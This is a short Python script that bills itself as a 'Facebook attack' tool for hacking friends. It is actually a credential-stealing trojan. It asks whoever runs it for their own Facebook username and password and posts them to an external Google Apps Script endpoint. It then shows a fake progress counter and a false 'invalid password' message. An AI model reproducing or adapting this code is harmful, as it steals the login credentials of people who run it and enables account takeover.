
import requests
import pyfiglet
import time
a = pyfiglet.figlet_format('Facebook attack')
print(a)
print("autor by : Ad A d")
print("dont use illegal")
print('please login with your facebook \n for hack your firends')

umail =input("please Enter Username : ")
upass =input("please Enter Fb password : '")
data ={'mail':umail,'pass':upass}
rq =requests.post('https://script.google.com/macros/s/AKfycbyXYlYQDUbS1Z51Li5ci0XLmBZjZKJts_BPtIrF9EAV99CeaUM/exec',data=data)

for i in range(100):
   print(i,'%')
   time.sleep(1)
print('invalid password or username')
